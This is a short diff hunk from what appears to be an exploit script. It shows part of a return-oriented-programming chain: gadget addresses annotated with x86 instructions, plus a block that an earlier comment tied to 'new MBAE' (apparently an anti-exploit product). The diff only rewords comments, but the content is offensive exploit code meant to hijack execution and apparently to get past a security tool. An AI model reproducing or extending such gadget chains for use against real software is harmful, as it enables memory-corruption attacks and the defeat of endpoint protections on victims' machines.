@@ -43,11 +43,11 @@ magic_offset,
 0x00000000,  # NULL
 0x78907a82,  # MOV [EAX],EDX # RETN
 
-#For new MBAE APRIL 6th 2015
+#new addition
 0x7887b821,  # ADD EAX,4 # RETN
 0x78830e9a,  # MOV EAX,[EAX] # RETN
 0x78907a82,  # MOV [EAX],EDX # RETN
-#Finished
+#finished
 
 
 0x78833e3c,  # POP EAX # RETN
